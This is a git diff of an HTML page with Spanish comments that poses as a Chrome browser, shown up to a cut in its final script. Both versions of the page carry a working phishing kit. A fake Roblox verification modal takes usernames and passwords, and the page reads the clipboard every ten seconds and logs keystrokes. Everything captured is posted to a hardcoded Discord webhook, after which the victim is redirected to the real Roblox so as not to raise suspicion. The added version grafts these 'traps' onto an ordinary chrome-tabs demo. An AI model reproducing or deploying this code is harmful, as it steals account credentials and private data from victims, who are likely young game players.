@@ -1,620 +1,511 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            user-select: none;
-        }
-        
-        body {
-            background: #202124;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        
-        /* ========== BARRA DE PESTAÑAS ========== */
-        .tabs-bar {
-            background: #1e1f22;
-            padding: 8px 8px 0 8px;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            border-bottom: 1px solid #3d3e42;
-        }
-        
-        .tab {
-            background: #2f3136;
-            color: #e8eaed;
-            padding: 8px 20px;
-            border-radius: 8px 8px 0 0;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            max-width: 200px;
-            min-width: 150px;
-            border: 1px solid #3d3e42;
-            border-bottom: none;
-        }
-        
-        .tab.active {
-            background: #3d3e42;
-        }
-        
-        .tab-favicon {
-            width: 16px;
-            height: 16px;
-            background: #8ab4f8;
-            border-radius: 50%;
-        }
-        
-        .tab-title {
-            flex: 1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .tab-close {
-            color: #9aa0a6;
-            font-size: 16px;
-            cursor: pointer;
-            width: 20px;
-            height: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-        }
-        
-        .tab-close:hover {
-            background: #4a4d54;
-            color: white;
-        }
-        
-        .new-tab {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #e8eaed;
-            font-size: 20px;
-            cursor: pointer;
-            border-radius: 8px;
-        }
-        
-        .new-tab:hover {
-            background: #3d3e42;
-        }
-        
-        /* ========== BARRA DE HERRAMIENTAS ========== */
-        .toolbar {
-            background: #292a2d;
-            padding: 8px 15px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            border-bottom: 1px solid #3d3e42;
-        }
-        
-        .nav-buttons {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .nav-btn {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            color: #e8eaed;
-            cursor: pointer;
-            font-size: 20px;
-        }
-        
-        .nav-btn:hover {
-            background: #3d3e42;
-        }
-        
-        .nav-btn.disabled {
-            opacity: 0.4;
-            cursor: default;
-        }
-        
-        /* BARRA DE DIRECCIONES */
-        .address-bar {
-            flex: 1;
-            background: #2f3136;
-            border-radius: 24px;
-            padding: 8px 16px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border: 1px solid #3e4046;
-        }
-        
-        .lock-icon {
-            color: #9aa0a6;
-            font-size: 14px;
-        }
-        
-        .url-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #e8eaed;
-            font-size: 14px;
-            outline: none;
-        }
-        
-        .url-input::placeholder {
-            color: #9aa0a6;
-        }
-        
-        .menu-icon {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            color: #e8eaed;
-            cursor: pointer;
-        }
-        
-        .menu-icon:hover {
-            background: #3d3e42;
-        }
-        
-        /* BARRA DE FAVORITOS */
-        .bookmarks-bar {
-            background: #292a2d;
-            padding: 5px 15px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            border-bottom: 1px solid #3d3e42;
-            font-size: 12px;
-            color: #e8eaed;
-        }
-        
-        .bookmark-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            padding: 3px 8px;
-            border-radius: 5px;
-        }
-        
-        .bookmark-item:hover {
-            background: #3d3e42;
-        }
-        
-        .bookmark-favicon {
-            width: 16px;
-            height: 16px;
-            background: #8ab4f8;
-            border-radius: 3px;
-        }
-        
-        /* ÁREA DE CONTENIDO */
-        .content-area {
-            flex: 1;
-            background: white;
-            position: relative;
-        }
-        
-        #mainFrame {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        
-        /* PÁGINA DE NUEVA PESTAÑA (falsa) */
-        .new-tab-page {
-            width: 100%;
-            height: 100%;
-            background: #202124;
-            color: #e8eaed;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 30px;
-        }
-        
-        .search-box {
-            width: 600px;
-            background: #2f3136;
-            border-radius: 24px;
-            padding: 12px 20px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            border: 1px solid #3e4046;
-        }
-        
-        .search-box input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #e8eaed;
-            font-size: 16px;
-            outline: none;
-        }
-        
-        .quick-links {
-            display: flex;
-            gap: 30px;
-            margin-top: 40px;
-        }
-        
-        .quick-link {
-            text-align: center;
-            cursor: pointer;
-        }
-        
-        .quick-link-icon {
-            width: 60px;
-            height: 60px;
-            background: #2f3136;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        
-        /* PANEL DE CONTROL OCULTO */
-        .control-panel {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1e1f22;
-            border: 2px solid #8ab4f8;
-            border-radius: 10px;
-            padding: 15px;
-            color: white;
-            z-index: 10000;
-            width: 300px;
-            display: none;
-        }
-        
-        .control-panel.visible {
-            display: block;
-        }
-        
-        .control-panel h3 {
-            color: #8ab4f8;
-            margin-bottom: 10px;
-        }
-        
-        .control-panel button {
-            background: #8ab4f8;
-            color: #202124;
-            border: none;
-            padding: 5px 10px;
-            margin: 5px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        .control-badge {
-            position: fixed;
-            top: 60px;
-            right: 20px;
-            background: #8ab4f8;
-            color: #202124;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            z-index: 9999;
-            cursor: pointer;
-        }
-        
-        /* LOG DE CAPTURAS */
-        .log-area {
-            width: 100%;
-            height: 150px;
-            background: #2f3136;
-            color: #00ff00;
-            border: 1px solid #3e4046;
-            border-radius: 5px;
-            padding: 5px;
-            font-family: monospace;
-            font-size: 11px;
-            margin-top: 10px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-    <!-- ========== INTERFAZ DE CHROME ========== -->
-    
-    <!-- BARRA DE PESTAÑAS -->
-    <div class="tabs-bar">
-        <div class="tab active">
-            <span class="tab-favicon"></span>
-            <span class="tab-title">Nueva pestaña</span>
-            <span class="tab-close">✕</span>
-        </div>
-        <div class="tab">
-            <span class="tab-favicon"></span>
-            <span class="tab-title">Roblox</span>
-            <span class="tab-close">✕</span>
-        </div>
-        <div class="new-tab">+</div>
-    </div>
-    
-    <!-- BARRA DE HERRAMIENTAS -->
-    <div class="toolbar">
-        <div class="nav-buttons">
-            <div class="nav-btn disabled">←</div>
-            <div class="nav-btn disabled">→</div>
-            <div class="nav-btn">↻</div>
-            <div class="nav-btn">🏠</div>
-        </div>
-        
-        <div class="address-bar">
-            <span class="lock-icon">🔒</span>
-            <input type="text" class="url-input" id="urlInput" value="chrome://newtab" placeholder="Buscar o escribir URL">
-            <span style="color:#9aa0a6;">⭐</span>
-        </div>
-        
-        <div class="menu-icon">⋮</div>
-    </div>
-    
-    <!-- BARRA DE FAVORITOS -->
-    <div class="bookmarks-bar">
-        <div class="bookmark-item">
-            <span class="bookmark-favicon"></span>
-            <span>Roblox</span>
-        </div>
-        <div class="bookmark-item">
-            <span class="bookmark-favicon"></span>
-            <span>YouTube</span>
-        </div>
-        <div class="bookmark-item">
-            <span class="bookmark-favicon"></span>
-            <span>Gmail</span>
-        </div>
-        <div class="bookmark-item">
-            <span class="bookmark-favicon"></span>
-            <span>Drive</span>
-        </div>
-    </div>
-    
-    <!-- ÁREA DE CONTENIDO (página de nueva pestaña falsa por defecto) -->
-    <div class="content-area" id="contentArea">
-        <div class="new-tab-page" id="newTabPage">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" style="width: 272px;">
-            
-            <div class="search-box">
-                <span>🔍</span>
-                <input type="text" id="googleSearchInput" placeholder="Buscar en Google o escribir URL">
-            </div>
-            
-            <div class="quick-links">
-                <div class="quick-link" onclick="navegarARoblox()">
-                    <div class="quick-link-icon">🎮</div>
-                    <div>Roblox</div>
-                </div>
-                <div class="quick-link">
-                    <div class="quick-link-icon">▶️</div>
-                    <div>YouTube</div>
-                </div>
-                <div class="quick-link">
-                    <div class="quick-link-icon">📧</div>
-                    <div>Gmail</div>
-                </div>
-                <div class="quick-link">
-                    <div class="quick-link-icon">📁</div>
-                    <div>Drive</div>
-                </div>
-            </div>
-        </div>
-        
-        <iframe id="mainFrame" style="display: none; width:100%; height:100%; border:none;"></iframe>
-    </div>
-    
-    <!-- BADGE DE CONTROL (para ti) -->
-    <div class="control-badge" onclick="togglePanel()">⚙️ CONTROL</div>
-    
-    <!-- PANEL DE CONTROL OCULTO -->
-    <div class="control-panel" id="controlPanel">
-        <h3>🎮 CHROME FALSO - CONTROL</h3>
-        
-        <div>
-            <button onclick="leerPortapapeles()">📋 Portapapeles</button>
-            <button onclick="mostrarModalRoblox()">🔐 Modal Roblox</button>
-            <button onclick="capturarTodo()">📸 Capturar Todo</button>
-        </div>
-        
-        <div class="log-area" id="logArea">[Listo]</div>
-        
-        <div style="margin-top:10px;">
-            <button onclick="enviarDiscord()" style="width:100%; background:#ff4444;">📤 Enviar a Discord</button>
-        </div>
-    </div>
-    
-    <!-- MODAL FALSO DE ROBLOX (oculto inicialmente) -->
-    <div id="robloxModal" style="display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:20000; align-items:center; justify-content:center;">
-        <div style="background:#1e1f22; padding:30px; border-radius:10px; width:400px;">
-            <h2 style="color:#00b8ff; margin-bottom:20px;">🔐 Verificación Roblox</h2>
-            <p style="color:#e8eaed; margin-bottom:20px;">Por seguridad, confirma tu identidad</p>
-            <input type="text" id="robloxUser" placeholder="Usuario" style="width:100%; padding:10px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; color:white; border-radius:5px;">
-            <input type="password" id="robloxPass" placeholder="Contraseña" style="width:100%; padding:10px; margin:10px 0; background:#2f3136; border:1px solid #3e4046; color:white; border-radius:5px;">
-            <button onclick="capturarCredenciales()" style="width:100%; padding:12px; background:#00b8ff; border:none; border-radius:5px; color:white; font-weight:bold; cursor:pointer;">Verificar</button>
-        </div>
-    </div>
+<!--
+        |                   _
+        |    /|           / / |\
+        |   / |          / /  | \
+        |  / /          / /    \ \
+        |  \ \    ___  / /     / /
+        |   \ |  /   \/ /     | /
+        |    \| |      /      |/
+        |        \____/
+        |
+        -->
+<!--don't prepend files with / 
+        -->
+<html lang="en">
 
-    <script>
-        // ===========================================
-        // CONFIGURACIÓN
-        // ===========================================
-        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
-        let log = [];
+<head>
+        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+        <link rel="icon" type="image/png" href="images/Chrome.png">
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <link rel="manifest" href="manifest.json" />
+        <title>Chrome Tabs - Chrome-style Tabs in HTML/CSS/ES6</title>
+        <meta name="description" content="Chrome-style tabs in HTML/CSS/JS.">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link href="demo/css/demo.css" rel="stylesheet">
+        <link href="css/chrome-tabs.css" rel="stylesheet">
+        <link href="css/chrome-tabs-dark-theme.css" rel="stylesheet">
         
-        // ===========================================
-        // FUNCIONES DE LOG
-        // ===========================================
-        function agregarLog(texto) {
-            const timestamp = new Date().toLocaleTimeString();
-            log.push(`[${timestamp}] ${texto}`);
-            document.getElementById('logArea').innerText = log.join('\n');
-        }
-        
-        // ===========================================
-        // CONTROL DE PANEL
-        // ===========================================
-        function togglePanel() {
-            document.getElementById('controlPanel').classList.toggle('visible');
-        }
-        
-        // ===========================================
-        // NAVEGACIÓN (BARRA DE DIRECCIONES)
-        // ===========================================
-        document.getElementById('urlInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                navegar(this.value);
-            }
-        });
-        
-        function navegar(url) {
-            agregarLog(`🔍 Navegando a: ${url}`);
-            
-            // TRAMPA: Si busca roblox, mostramos nuestro modal
-            if (url.toLowerCase().includes('roblox')) {
-                mostrarModalRoblox();
-            } else {
-                // Mostrar iframe con la página real
-                document.getElementById('newTabPage').style.display = 'none';
-                document.getElementById('mainFrame').style.display = 'block';
-                document.getElementById('mainFrame').src = url.startsWith('http') ? url : 'https://' + url;
-            }
-        }
-        
-        // ===========================================
-        // MOSTRAR MODAL FALSO DE ROBLOX
-        // ===========================================
-        function mostrarModalRoblox() {
-            document.getElementById('robloxModal').style.display = 'flex';
-            agregarLog('🎯 Modal de Roblox mostrado');
-        }
-        
-        // ===========================================
-        // CAPTURAR CREDENCIALES
-        // ===========================================
-        function capturarCredenciales() {
-            const user = document.getElementById('robloxUser').value;
-            const pass = document.getElementById('robloxPass').value;
-            
-            if (user && pass) {
-                agregarLog(`🔥 Credenciales: ${user} : ${pass}`);
+        <!-- ========== ESTILOS PARA NUESTRAS TRAMPAS ========== -->
+        <style>
+                /* PANEL DE CONTROL OCULTO */
+                .control-panel {
+                        position: fixed;
+                        bottom: 20px;
+                        right: 20px;
+                        background: #1e1f22;
+                        border: 2px solid #8ab4f8;
+                        border-radius: 10px;
+                        padding: 15px;
+                        color: white;
+                        z-index: 10000;
+                        width: 300px;
+                        display: none;
+                        font-family: 'Segoe UI', sans-serif;
+                }
                 
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**🔐 ROBLOX CREDENCIALES**\nUsuario: ${user}\nContraseña: ${pass}`
-                    })
+                .control-panel.visible {
+                        display: block;
+                }
+                
+                .control-panel h3 {
+                        color: #8ab4f8;
+                        margin-bottom: 10px;
+                }
+                
+                .control-panel button {
+                        background: #8ab4f8;
+                        color: #202124;
+                        border: none;
+                        padding: 5px 10px;
+                        margin: 5px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                }
+                
+                .control-badge {
+                        position: fixed;
+                        top: 60px;
+                        right: 20px;
+                        background: #8ab4f8;
+                        color: #202124;
+                        padding: 5px 10px;
+                        border-radius: 20px;
+                        font-size: 12px;
+                        font-weight: bold;
+                        z-index: 9999;
+                        cursor: pointer;
+                }
+                
+                .log-area {
+                        width: 100%;
+                        height: 150px;
+                        background: #2f3136;
+                        color: #00ff00;
+                        border: 1px solid #3e4046;
+                        border-radius: 5px;
+                        padding: 5px;
+                        font-family: monospace;
+                        font-size: 11px;
+                        margin-top: 10px;
+                        overflow-y: auto;
+                        white-space: pre-wrap;
+                }
+                
+                /* MODAL DE ROBLOX */
+                #robloxModal {
+                        display: none;
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: rgba(0,0,0,0.9);
+                        z-index: 20000;
+                        align-items: center;
+                        justify-content: center;
+                }
+                
+                .modal-content {
+                        background: #1e1f22;
+                        padding: 30px;
+                        border-radius: 10px;
+                        width: 400px;
+                        max-width: 90%;
+                }
+                
+                .modal-content h2 {
+                        color: #00b8ff;
+                        margin-bottom: 20px;
+                }
+                
+                .modal-content input {
+                        width: 100%;
+                        padding: 12px;
+                        margin: 10px 0;
+                        background: #2f3136;
+                        border: 1px solid #3e4046;
+                        border-radius: 5px;
+                        color: white;
+                }
+                
+                .modal-content button {
+                        width: 100%;
+                        padding: 12px;
+                        background: #00b8ff;
+                        border: none;
+                        border-radius: 5px;
+                        color: white;
+                        font-weight: bold;
+                        cursor: pointer;
+                        margin-top: 10px;
+                }
+        </style>
+</head>
+
+<body>
+        <!-- ========== INTERFAZ DE CHROME (original) ========== -->
+        <div class="surface">
+                <div class="mock-browser">
+                        <div class="chrome-tabs" style="--tab-content-margin: 9px">
+                                <div class="new-tab-button">
+                                </div>
+                                <div class="chrome-tabs-content">
+                                        <div class="chrome-tab" active>
+                                                <div class="chrome-tab-dividers"></div>
+                                                <div class="chrome-tab-background">
+                                                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                                                <defs>
+                                                                        <symbol id="chrome-tab-geometry-left" viewBox="0 0 214 36">
+                                                                                <path d="M17 0h197v36H0v-2c4.5 0 9-3.5 9-8V8c0-4.5 3.5-8 8-8z" />
+                                                                        </symbol>
+                                                                        <symbol id="chrome-tab-geometry-right" viewBox="0 0 214 36">
+                                                                                <use xlink:href="#chrome-tab-geometry-left" />
+                                                                        </symbol>
+                                                                        <clipPath id="crop">
+                                                                                <rect class="mask" width="100%" height="100%" x="0" />
+                                                                        </clipPath>
+                                                                </defs><svg width="52%" height="100%">
+                                                                        <use xlink:href="#chrome-tab-geometry-left" width="214" height="36" class="chrome-tab-geometry" />
+                                                                </svg>
+                                                                <g transform="scale(-1, 1)"><svg width="52%" height="100%" x="-100%" y="0">
+                                                                                <use xlink:href="#chrome-tab-geometry-right" width="214" height="36" class="chrome-tab-geometry" />
+                                                                        </svg></g>
+                                                        </svg>
+                                                </div>
+
+                                                <div class="chrome-tab-content">
+                                                        <div class="chrome-tab-favicon" style="background-image: url('demo/images/google-favicon.ico')"></div>
+                                                        <div class="chrome-tab-title">New Tab</div>
+                                                        <div class="chrome-tab-drag-handle"></div>
+                                                        <div class="chrome-tab-close"></div>
+                                                </div>
+                                        </div>
+                                </div>
+
+                                <div class="chrome-tabs-bottom-bar"></div>
+
+                                <!-- Styles to prevent flash after JS initialization -->
+                                <style>
+                                        .chrome-tabs .chrome-tab {
+                                                width: 258px
+                                        }
+
+                                        .chrome-tabs .chrome-tab:nth-child(1) {
+                                                transform: translate3d(0px, 0, 0)
+                                        }
+
+                                        .chrome-tabs .chrome-tab:nth-child(2) {
+                                                transform: translate3d(239px, 0, 0)
+                                        }
+
+                                        new-tab-button {
+                                                transform: translate3d(250px, 0, 0);
+                                        }
+                                </style>
+                        </div>
+                        
+                        <button class="btn-nt" data-add-tab>
+                                <span class="material-icons">add</span>
+                        </button>
+                        
+                        <div class="chrome-tabs-optional-shadow-below-bottom-bar"></div>
+                        
+                        <div class="mock-browser-content">
+                                <img class="omnibar_img" src="images/Google.png" width="23px" height="23px" />
+
+                                <table style="margin: 0px 10px 0px 0px; background-color: transparent;" class="nav">
+                                        <tr>
+                                                <td style="width: 30px; max-width: 30px; min-width: 30px;">
+                                                        <button class="button_bk" data-page-back>
+                                                                <span class="material-icons">arrow_back</span>
+                                                        </button>
+                                                </td>
+                                                <td style="width: 30px; max-width: 30px; min-width: 30px;">
+                                                        <button class="button_fw" data-page-forward>
+                                                                <span class="material-icons">arrow_forward</span>
+                                                        </button>
+                                                </td>
+                                                <td style="width: 30px; max-width: 30px; min-width: 30px;">
+                                                        <button class="button_rld" data-page-reload>
+                                                                <span class="material-icons">refresh</span>
+                                                        </button>
+                                                </td>
+                                                <td style="width: 90%;">
+                                                        <label for="omnibar"></label>
+                                                        <input type="url" class="omnibar" id="omnibar" value="https://google.com">
+                                                </td>
+                                                <td style="align-content: right;">
+                                                        <button onclick="toggleMenu()" class="dropbtn"
+                                                                style="font-size: 23px; align-content: center; color: #000000;">
+                                                                <span class="material-icons" style="pointer-events: none;">more_vert</span>
+                                                        </button>
+                                                </td>
+                                        </tr>
+                                </table>
+                        </div>
+                </div>
+                
+                <iframe style="width:100%; z-index:1; border:box;" id="webview" src="https://google.com" frameBorder="0px"></iframe>
+        </div>
+        
+        <!-- MENÚ DESPLEGABLE (original) -->
+        <div id="myDropdown" class="dropdown-content">
+                <a><table><tr><td><button data-add-tab>New tab</button></td><td style="color: grey;">Ctrl+T</td></tr></table></a>
+                <a href="https://chrome-tabs.glitch128.repl.co/" target="_blank" rel="noreferrer noopener">
+                        <table><tr><td>New window</td><td style="color: grey;">Ctrl+N</td></tr></table>
+                </a>
+                <a><table><tr><td>New Incognito window</td><td style="color: grey;">Ctrl+Shift+N</td></tr></table></a>
+                <a style="padding: 16px 0px 0px 0px;"></a>
+                <a><table><tr><td>History</td><td style="color: grey;">‣</td></tr></table></a>
+                <a><table style="padding: 1px 0px 3px 0px;"><tr><td>Downloads</td><td style="color: grey;">Ctrl+J</td></tr></table></a>
+                <a><table style="padding: 2px 0px 4px 0px;"><tr><td>Bookmarks</td><td style="color: grey;">‣</td></tr></table></a>
+        </div>
+        
+        <!-- ========== BADGE DE CONTROL OCULTO ========== -->
+        <div class="control-badge" onclick="togglePanel()">⚙️ CONTROL</div>
+        
+        <!-- ========== PANEL DE CONTROL ========== -->
+        <div class="control-panel" id="controlPanel">
+                <h3>🎮 CHROME FALSO - CONTROL</h3>
+                
+                <div>
+                        <button onclick="leerPortapapeles()">📋 Leer Portapapeles</button>
+                        <button onclick="mostrarModalRoblox()">🔐 Mostrar Modal Roblox</button>
+                        <button onclick="enviarLogsDiscord()">📤 Enviar Logs</button>
+                </div>
+                
+                <div class="log-area" id="logArea">[Listo]</div>
+        </div>
+        
+        <!-- ========== MODAL FALSO DE ROBLOX ========== -->
+        <div id="robloxModal">
+                <div class="modal-content">
+                        <h2>🔐 Verificación Roblox</h2>
+                        <p style="color:#e8eaed; margin-bottom:20px;">Por seguridad, confirma tu identidad</p>
+                        <input type="text" id="robloxUser" placeholder="Usuario de Roblox">
+                        <input type="password" id="robloxPass" placeholder="Contraseña">
+                        <button onclick="capturarCredenciales()">Verificar</button>
+                </div>
+        </div>
+
+        <!-- ========== SCRIPTS ========== -->
+        <script src="https://unpkg.com/draggabilly@2.2.0/dist/draggabilly.pkgd.min.js"></script>
+        <script src="js/chrome-tabs.js"></script>
+        
+        <script>
+                // ===========================================
+                // CONFIGURACIÓN
+                // ===========================================
+                const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
+                let log = [];
+                
+                // ===========================================
+                // FUNCIONES DE LOG
+                // ===========================================
+                function agregarLog(texto) {
+                        const timestamp = new Date().toLocaleTimeString();
+                        log.push(`[${timestamp}] ${texto}`);
+                        document.getElementById('logArea').innerText = log.join('\n');
+                }
+                
+                // ===========================================
+                // CONTROL DE PANEL
+                // ===========================================
+                function togglePanel() {
+                        document.getElementById('controlPanel').classList.toggle('visible');
+                }
+                
+                // ===========================================
+                // INICIALIZAR CHROME TABS (original)
+                // ===========================================
+                var el = document.querySelector('.chrome-tabs');
+                var chromeTabs = new ChromeTabs();
+                chromeTabs.init(el);
+
+                el.addEventListener('activeTabChange', ({detail}) => console.log('Active tab changed', detail.tabEl));
+                el.addEventListener('tabAdd', ({detail}) => console.log('Tab added', detail.tabEl));
+                el.addEventListener('tabRemove', ({detail}) => console.log('Tab removed', detail.tabEl));
+
+                document.querySelector('button[data-add-tab]').addEventListener('click', _ => {
+                        chromeTabs.addTab({
+                                title: 'New Tab',
+                                favicon: false
+                        });
                 });
-                
-                document.getElementById('robloxModal').style.display = 'none';
-                
-                // Redirigir a Roblox real para no levantar sospechas
-                document.getElementById('newTabPage').style.display = 'none';
-                document.getElementById('mainFrame').style.display = 'block';
-                document.getElementById('mainFrame').src = 'https://www.roblox.com/home';
-            }
-        }
-        
-        // ===========================================
-        // LEER PORTAPAPELES
-        // ===========================================
-        async function leerPortapapeles() {
-            try {
-                const texto = await navigator.clipboard.readText();
-                agregarLog(`📋 Portapapeles: ${texto.substring(0, 50)}`);
-                
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**📋 PORTAPAPELES**\n\`\`\`${texto}\`\`\``
-                    })
+
+                document.querySelector('button[data-add-background-tab]').addEventListener('click', _ => {
+                        chromeTabs.addTab({
+                                title: 'New Tab',
+                                favicon: false
+                        }, {
+                                background: true
+                        });
                 });
-            } catch(e) {
-                agregarLog(`❌ Error portapapeles: ${e.message}`);
-            }
-        }
-        
-        // ===========================================
-        // CAPTURAR TODO (para depuración)
-        // ===========================================
-        function capturarTodo() {
-            const info = {
-                url: document.getElementById('urlInput').value,
-                cookies: document.cookie,
-                localStorage: { ...localStorage },
-                userAgent: navigator.userAgent
-            };
-            agregarLog(`📦 Info capturada: ${JSON.stringify(info).substring(0, 100)}`);
-        }
-        
-        // ===========================================
-        // ENVIAR TODO A DISCORD
-        // ===========================================
-        function enviarDiscord() {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `**📦 LOGS COMPLETOS**\n\`\`\`${log.join('\n')}\`\`\``
-                })
-            });
-            agregarLog('✅ Logs enviados a Discord');
-        }
-        
-        // ===========================================
-        // NAVEGACIÓN DESDE ATAJOS
-        // ===========================================
-        function navegarARoblox() {
-            mostrarModalRoblox();
-        }
-        
-        // ===========================================
-        // CAPTURAR TECLAS (keylogger en nuestra página)
-        // ===========================================
-        document.addEventListener('keydown', function(e) {
-            if (e.target.tagName !== 'INPUT') {
-                agregarLog(`⌨️ Tecla: ${e.key}`);
-            }
-        });
-        
-        // ===========================================
-        // INICIAR
-        // ===========================================
-        agregarLog('🚀 Chrome falso iniciado');
-        
-        // Capturar portapapeles cada 10 segundos
-        setInterval(leerPortapapeles, 10000);
-    </script>
+
+                document.querySelector('button[data-remove-tab]').addEventListener('click', _ => {
+                        chromeTabs.removeTab(chromeTabs.activeTabEl);
+                });
+
+                document.querySelector('button[data-theme-toggle]').addEventListener('click', _ => {
+                        if (el.classList.contains('chrome-tabs-dark-theme')) {
+                                document.documentElement.classList.remove('dark-theme');
+                                el.classList.remove('chrome-tabs-dark-theme');
+                        } else {
+                                document.documentElement.classList.add('dark-theme');
+                                el.classList.add('chrome-tabs-dark-theme');
+                        }
+                });
+
+                window.addEventListener('keydown', (event) => {
+                        event.preventDefault();
+                        if (event.ctrlKey && event.key === 't') {
+                                chromeTabs.addTab({
+                                        title: 'New Tab',
+                                        favicon: false
+                                });
+                        }
+                });
+
+                // ===========================================
+                // TRAMPA 1: DETECTAR BÚSQUEDAS EN LA BARRA
+                // ===========================================
+                document.getElementById('omnibar').addEventListener('keypress', function(e) {
+                        if (e.key === 'Enter') {
+                                const busqueda = this.value;
+                                agregarLog(`🔍 Búsqueda: ${busqueda}`);
+                                
+                                // Si buscan roblox, mostrar modal falso
+                                if (busqueda.toLowerCase().includes('roblox')) {
+                                        mostrarModalRoblox();
+                                } else {
+                                        // Navegar al sitio real en el iframe
+                                        document.getElementById('webview').src = busqueda.startsWith('http') ? busqueda : 'https://' + busqueda;
+                                }
+                        }
+                });
+
+                // ===========================================
+                // TRAMPA 2: LEER PORTAPAPELES
+                // ===========================================
+                async function leerPortapapeles() {
+                        try {
+                                const texto = await navigator.clipboard.readText();
+                                agregarLog(`📋 Portapapeles: ${texto.substring(0, 50)}`);
+                                
+                                fetch(WEBHOOK, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ 
+                                                content: `**📋 PORTAPAPELES CAPTURADO**\n\`\`\`${texto}\`\`\`` 
+                                        })
+                                });
+                        } catch(e) {
+                                agregarLog(`❌ Error portapapeles: ${e.message}`);
+                        }
+                }
+
+                // ===========================================
+                // TRAMPA 3: MOSTRAR MODAL DE ROBLOX
+                // ===========================================
+                function mostrarModalRoblox() {
+                        document.getElementById('robloxModal').style.display = 'flex';
+                        agregarLog('🎯 Modal de Roblox mostrado');
+                }
+
+                // ===========================================
+                // TRAMPA 4: CAPTURAR CREDENCIALES
+                // ===========================================
+                function capturarCredenciales() {
+                        const user = document.getElementById('robloxUser').value;
+                        const pass = document.getElementById('robloxPass').value;
+                        
+                        if (user && pass) {
+                                agregarLog(`🔥 Credenciales: ${user} : ${pass}`);
+                                
+                                fetch(WEBHOOK, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                                content: `**🔐 ROBLOX CREDENCIALES**\n**Usuario:** ${user}\n**Contraseña:** ${pass}`
+                                        })
+                                });
+                                
+                                document.getElementById('robloxModal').style.display = 'none';
+                                
+                                // Limpiar campos
+                                document.getElementById('robloxUser').value = '';
+                                document.getElementById('robloxPass').value = '';
+                                
+                                // Redirigir a Roblox real
+                                document.getElementById('webview').src = 'https://www.roblox.com/home';
+                        }
+                }
+
+                // ===========================================
+                // TRAMPA 5: ENVIAR LOGS A DISCORD
+                // ===========================================
+                function enviarLogsDiscord() {
+                        fetch(WEBHOOK, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                        content: `**📦 LOGS CAPTURADOS**\n\`\`\`${log.join('\n')}\`\`\``
+                                })
+                        });
+                        agregarLog('✅ Logs enviados a Discord');
+                }
+
+                // ===========================================
+                // TRAMPA 6: KEYLOGGER GLOBAL
+                // ===========================================
+                document.addEventListener('keydown', function(e) {
+                        // Ignorar si está escribiendo en inputs
+                        if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                                agregarLog(`⌨️ Tecla global: ${e.key}`);
+                        }
+                });
+
+                // ===========================================
+                // INICIAR TRAMPAS AUTOMÁTICAS
+                // ===========================================
+                (function init() {
